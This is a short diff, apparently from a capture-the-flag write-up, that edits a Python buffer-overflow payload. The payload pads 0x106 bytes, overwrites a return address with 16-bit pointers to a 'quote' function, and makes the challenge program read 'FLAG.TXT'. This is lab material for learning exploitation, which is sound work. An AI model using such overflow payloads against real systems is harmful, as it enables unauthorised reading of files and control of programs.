@@ -834,7 +834,7 @@ To create `in1.bin` using the stack (second method):
 #!/usr/bin/python3
 
 payload  = b''
-payload += b'datajerk\nsupersneaky2020\nC\n'
+payload += b'FLAG.TXT\nsupersneaky2020\nC\n'
 payload += 0x106*b'A'
 payload += p16(0xe98a) # quote function
 payload += p16(0xff8c + 2 + 2 + 2) # return address, pointer to file, pointer to rb, then "FLAG.TXT"
